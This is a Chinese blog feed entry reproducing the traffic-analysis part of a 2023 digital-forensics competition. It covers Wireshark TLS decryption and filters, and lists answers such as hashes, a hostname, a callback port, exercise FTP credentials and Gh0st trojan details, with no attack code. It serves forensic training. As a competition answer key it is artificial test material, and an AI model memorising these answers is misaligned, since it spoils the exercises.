<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iyheart的博客</title>
  
  <subtitle>分享笔记和学习历程</subtitle>
  <link href="http://iyheart.github.io/atom.xml" rel="self"/>
  
  <link href="http://iyheart.github.io/"/>
  <updated>2025-11-08T13:27:36.383Z</updated>
  <id>http://iyheart.github.io/</id>
  
  <author>
    <name>iyheart</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>电子数据取证2023年盘古石复现</title>
    <link href="http://iyheart.github.io/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/"/>
    <id>http://iyheart.github.io/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-11-05T15:33:12.000Z</published>
    <updated>2025-11-08T13:27:36.383Z</updated>
    
    <content type="html"><![CDATA[<ul><li>该比赛复现完全看视频复现的，不是自己做题体会，先复现补补知识点，再自己做点题。（因为自己做题的时候越做越发现有点不对劲，做不出来的仍然做不出来。）</li></ul><h1 id="流量分析">流量分析</h1><h2 id="前提准备">前提准备</h2><p>题目检材给了两个文件，一个是<code>flower.pcapng</code>，这个是正常流量包文件，然后还给了一个<code>key.log</code>文件。（视频中猜测是要用<code>key.log</code>解密出<code>http</code>协议）。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235130516.png" alt="image-20251105235130516"></p><p>打开流量包后发现，没有http协议，但是tls协议一大堆，这下应该就是用<code>key.log</code>解密<code>tls</code>协议，解密出来的内容应该就是<code>http</code>协议了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235400012.png" alt="image-20251105235400012"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235425921.png" alt="image-20251105235425921"></p><h2 id="解密tls">解密TLS</h2><p>首先选中编辑选项</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235617612.png" alt="image-20251105235617612"></p><p>然后在协议这边选中TLS协议</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235657011.png" alt="image-20251105235657011"></p><p>选中之后是这样的界面，接下来只要点击<code>流量</code>，然后将<code>key.log</code>选中即可，选中之后就解密完成了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235810158.png" alt="image-20251105235810158"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235905915.png" alt="image-20251105235905915"></p><h2 id="question1">question1√</h2><p>计算流量包文件的SHA256值是？[答案：字母小写]</p><h3 id="方法一">方法一</h3><p>没什么好说的，直接将流量包拖入<code>cyberchef</code>就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105234250745.png" alt="image-20251105234250745"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2d689add281b477c82b18af8ab857ef5be6badf253db1c1923528dd73b3d61a9</span><br></pre></td></tr></table></figure><h3 id="补充方法二">补充方法二</h3><p>其实可以直接在<code>wireshark</code>这边分析的</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000400729.png" alt="image-20251106000400729"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000415809.png" alt="image-20251106000415809"></p><h2 id="question2">question2√</h2><p>流量包长度在“640-1279”之间的的数据包总共有多少？[答案：100]</p><h3 id="方法一">方法一</h3><p>本题就是要熟练掌握流量包的过滤指令，其中过滤流量包长度指令<code>frame.len &gt;=640 and frame.len &lt;= 1279</code>，直接可以马上过滤出来。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105234513746.png" alt="image-20251105234513746"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">179</span><br></pre></td></tr></table></figure><h3 id="补充方法二">补充方法二</h3><p>其实不需要使用命令，可以直接查看<code>wireshark</code>这个位置即可看到协议分组的数量，并且恰好是<code>640-1279</code>这个地方</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000615587.png" alt="image-20251106000615587"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000632121.png" alt="image-20251106000632121"></p><h2 id="question3">question3√</h2><p>黑客使用的计算机操作系统是？[答案：windows7 x32]</p><h3 id="方法一">方法一</h3><ul><li>这题的流量分析我感觉找不出来黑客的操作系统，但是可以结合比赛给的黑客电脑检材<code>disk0.E1</code>、<code>disk1.E1</code></li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105234706992.png" alt="image-20251105234706992"></p><ul><li>取出来后发现得到了Windows版本和系统位数，结合答案的格式，最终答案如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows10 x64</span><br></pre></td></tr></table></figure><h3 id="方法二">方法二</h3><p>直接分析流量包，流量包解密之后直接看http的请求头就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000827119.png" alt="image-20251106000827119"></p><h2 id="question4">question4√</h2><p>黑客上传文件到哪个网盘？[答案：xx网盘]</p><p>通过查看解密后的http协议，会发现黑客访问的是百度网盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000929093.png" alt="image-20251106000929093"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">百度网盘</span><br></pre></td></tr></table></figure><h2 id="question5">question5√</h2><p>黑客上传网盘的中间件是？[答案：xxxx]</p><h3 id="中间件">中间件</h3><p>如果要是我在做题而不是看视频复现，我是不明白题目在问什么的。中间件有了解过，但是题目表达的太简单了。现在先了解一下中间件</p><ul><li><p>在 Web 服务中，<strong>中间件（Middleware）</strong> 是指介于 <strong>操作系统与应用程序之间</strong>、或者 <strong>Web 服务器与业务逻辑之间</strong> 的一层软件组件。它的主要作用是<strong>连接、协调、处理请求、增强功能</strong>，让应用开发更加灵活、模块化和高效。</p></li><li><p>上面对于中间件的描述还是总结性比较高的，下面来举几个例子：</p><ul><li>中间件可以用来处理<code>http</code>请求，比如说使用<code>GET</code>方法访问某些网站路径，一些中间件必如<code>Nginx</code>、<code>apache</code>等就会将参数<code>GET</code>参数提取出来转换为规范格式，再传给后端。</li><li>中间件还用来处理<code>http</code>响应，一个请求发过来，后端程序要发送响应也需要经过<code>nginx</code>、<code>apache</code>等后端程序，将<code>http</code>请求格式规范化。</li><li>中间件还可以在收到请求的时候判断客户端是否有权限访问，或者是否进行了登录，是否超过了限流</li></ul></li><li><p>所以中间件就相当于一个中间人以及守门人，中间人就是会将数据进行处理、清洗等，守门人就是会判断权限。</p></li><li><p>常用的中间件有如下几个，<code>web</code>服务器中间件有如下几个：<code>nginx</code>、<code>Apache</code>、<code>Tomcat</code></p></li></ul><h3 id="解题">解题</h3><p>因为中间件是在服务端，我们需要看的是服务端响应过来的http响应包，首先要确定百度网盘的<code>ip</code>为<code>110.242.69.43</code>等这些ip地址</p><p>翻到稍微后面一点的<code>http</code>协议，就会看到响应包中有携带<code>server</code>参数，该参数里面写的是<code>nginx</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106003655320.png" alt="image-20251106003655320"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure><h2 id="question6">question6√</h2><p>黑客首次登陆网盘时间是？[答案：2000-01-01 01:00:33]</p><p>首先如果是像这种登录的话，都是要传递密码和账号的，而传递密码和账号都是使用<code>POST</code>方法（因为GET方法作为请求头登录的话是不安全的），所以<code>GET</code>方法的请求头就不需要看，直接使用搜索功能。查找到首次<code>POST</code>出现的地方</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106004523925.png" alt="image-20251106004523925"></p><p>直接就追踪流进行分析，在这个POST请求过后就会出现</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106004603180.png" alt="image-20251106004603180"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011225678.png" alt="image-20251106011225678"></p><p>所以该POST参数的包就很可能是相应的登录请求包了，直接点击查看包发送的详细时间</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011321958.png" alt="image-20251106011321958"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023-05-11 12:03:52</span><br></pre></td></tr></table></figure><h2 id="question7">question7√</h2><p>黑客上传到网盘的txt文件的md5值是？[答案：字母小写]</p><p>这题比较容易，既然有文件上传操作，那么直接导出对象看看</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011729876.png" alt="image-20251106011729876"></p><p>直接过滤<code>.txt</code>，就会发现只有两个</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011802943.png" alt="image-20251106011802943"></p><p>直接导出这两个，其中一个是上传的文件具体内容</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011820362.png" alt="image-20251106011820362"></p><p>另一个就是上传文件的md5值</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011846867.png" alt="image-20251106011846867"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6a5aff7bec78dd1e4fc23e571b664b50</span><br></pre></td></tr></table></figure><h2 id="question8">question8√</h2><p>黑客上传到网盘的txt文件第8行的内容是？[答案：XXX]</p><h3 id="解题方法">解题方法</h3><p>这题只要导出那个文件即可，但是导出的文件有包含请求头，所以要去掉前四行，从第五行开始算起。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012157625.png" alt="image-20251106012157625"></p><ul><li>或者可以直接看相应流量包</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012413827.png" alt="image-20251106012413827"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br></pre></td></tr></table></figure><h3 id="补充说明">补充说明</h3><ul><li>该题如何确定正确的行数，突然想到不是有给md5值吗？直接去除行数算md5值，要是md5对了就是真正的行数了。</li><li>一开始是这样的开头，验证md5，发现不对</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012826645.png" alt="image-20251106012826645"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012931020.png" alt="image-20251106012931020"></p><ul><li>接下来一行一行去除，看看去除到哪一行md5值是正确的（注意：导出对象的后面还有一些webkit的东西也要删除）</li><li>最后发现第一行是空行，所以<code>$$</code>是第八行。</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106013527726.png" alt="image-20251106013527726"></p><h2 id="question9">question9√</h2><p>被入侵主机的计算机名是？[答案：XXXXXXXXXXX]</p><p>看到这题有点疑惑，为什么直接搜索<code>DHCP</code>就能找到主机名，怎么想到的。</p><p>首先要熟悉一下黑客的攻击流程，当黑客能<code>RCE</code>后就要想办法<code>getshell</code>，然后再远程连接该主机，进行内网渗透等操作。</p><p>在渗透的时候黑客有以下两种情况可以选择，而我们这个题目其实属于<strong>场景二</strong></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106015221976.png" alt="image-20251106015221976"></p><p>所以直接搜索<code>DHCP</code>协议，<code>DHCP</code>协议会出现主机名称</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106015418579.png" alt="image-20251106015418579"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIN-BFA1TO8PTNP</span><br></pre></td></tr></table></figure><h2 id="question10">question10√</h2><p>被入侵电脑的数据回传端口是？[答案：11]</p><p>说实话没明白题目问的具体意思，直接把他当成被入侵电脑的传输数据的端口了，结果发现答案错的。看了视频后发现其实是被入侵电脑回传到黑客主机的什么端口。</p><ul><li>通过前面的分析其实已经了解到被入侵电脑的<code>ip</code>为<code>192.168.100.139</code>，而黑客电脑<code>ip</code>为<code>192.168.100.141</code>，所以直接过滤数据包</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst==192.168.100.141 and ip.src==192.168.100.139</span><br></pre></td></tr></table></figure><ul><li>此时黑客打到内网后，开始打<code>ftp</code>服务器，通过密码直接登录到了<code>ftp</code>服务器</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021003405.png" alt="image-20251106021003405"></p><ul><li>接下去直接上传木马了</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021048513.png" alt="image-20251106021048513"></p><ul><li>接着就是分析到<code>Gh0st</code>这个鬼东东了（然后再后续分析木马的时候也会知道）</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021237976.png" alt="image-20251106021237976"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021312471.png" alt="image-20251106021312471"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021337688.png" alt="image-20251106021337688"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8000</span><br></pre></td></tr></table></figure><h2 id="question11">question11√</h2><p>流量包中ftp服务器的用户密码是？[答案：abcd]</p><p>直接过滤出ftp协议出来，然后发现<code>Logged on</code>，此时其实就可以知道用户<code>www</code>的密码是<code>ftp</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021621862.png" alt="image-20251106021621862"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp</span><br></pre></td></tr></table></figure><h2 id="question12">question12√</h2><p>流量包中ftp服务器中的木马文件的md5值是？</p><p>在连接上<code>ftp</code>后，继续追踪流会发现ftp服务器被上传木马了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106022112702.png" alt="image-20251106022112702"></p><p>直接将这个木马保存下来，计算md5值</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106022153737.png" alt="image-20251106022153737"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2a49a00a1f0b898074be95a5bbc436e3</span><br></pre></td></tr></table></figure><h2 id="question13">question13√</h2><p>木马文件伪造的软件版本是？[答案：0.0.0.0]</p><p>直接查看木马属性即可</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106022229739.png" alt="image-20251106022229739"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7.5.0.1039</span><br></pre></td></tr></table></figure><h2 id="question14">question14</h2><p>黑客上传到网盘的压缩包解压密码是？[答案：XXXXXXXXXXX]★★★★★</p><h2 id="question15">question15</h2><p>黑客上传到网盘的压缩包内文件的内容是？[答案：xxxxxxx]★★★★★</p><h2 id="question16">question16</h2><p>分析技术人员电脑内的手机流量包，给出技术人员的虚拟身份账号是？[答案格式:13039456655]</p><p><code>question14</code>和<code>question15</code>那两题最后再看，现在先看<code>question16~20</code>，首先这个分析并不是黑客的那个流量包了。</p><p>这个流量包是技术人员电脑里面的流量包，所以我们需要仿真该电脑，或者直接用火眼去将该流量包给导出来。</p><h2 id="question17">question17</h2><p>分析技术人员电脑内的手机流量包，给出技术人员的虚拟身份密码是？[答案格式:b3039456655]</p><h2 id="question18">question18</h2><p>分析技术人员电脑内的手机流量包，分析技术人员的看过几段短视频？[答案格式:3]</p><h2 id="question19">question19</h2><p>分析技术人员电脑内的手机流量包，分析技术人员最后打开的软件的程序名称是？[答案格式:微信]</p><h2 id="question20">question20</h2><p>分析技术人员电脑内的手机流量包，分析安全防护的服务器地址是？[答案格式:127.0.0.1]</p><h1 id="移动智能终端取证">移动智能终端取证</h1><h2 